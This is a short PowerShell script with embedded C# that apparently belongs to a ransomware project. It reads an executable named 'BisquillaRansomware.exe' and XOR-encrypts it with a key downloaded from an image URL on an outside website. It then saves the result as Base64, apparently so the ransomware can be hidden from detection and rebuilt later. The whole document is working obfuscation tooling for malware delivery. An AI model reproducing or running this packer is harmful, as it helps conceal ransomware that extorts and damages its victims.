# Encrypt BisquillaRansomware using OTP and Convert into Base64 Data

$InputFile = "BisquillaRansomware.exe";
$OutputFile = "BisquillaRansomware.bin";
$ImageKeyUri = "https://extra.globo.com/incoming/5921498-9a8-629/w1920h1080/marte-1.jpg";

# Reguster OTP Encryption Method
Add-Type -TypeDefinition @"
     using System;
     using System.IO;
     using System.Net;
     public class OtpEncryption
     {
        public static void Convert(string sourceFile, string destinationFile, String imageKeyUri) 
        {

            // Download Image from Web (to be used as Ransomware Base64 Data Decryption Key)
            byte[] key = System.Text.Encoding.UTF8.GetBytes(
                new WebClient().DownloadString(imageKeyUri)
            );

            // Open Ransomware SourceCode
            byte[] plainRansomware = File.ReadAllBytes(sourceFile);

            // Encrypt
            byte[] finalBinary = EncryptDecrypt(plainRansomware, key);

            // Save Base64
            File.WriteAllBytes(destinationFile, System.Text.Encoding.ASCII.GetBytes(System.Convert.ToBase64String(finalBinary)));

        }

        public static byte[] EncryptDecrypt(byte[] source, byte[] key)
        {
            byte[] hResult = new byte[source.Length];

            for (int i = 0; i < source.Length; i++)
            {
                hResult[i] = (byte) (source[i] ^ key[i]);
            }

            return hResult;
        }
     }
"@;

[OtpEncryption]::Convert($InputFile, $OutputFile, $ImageKeyUri);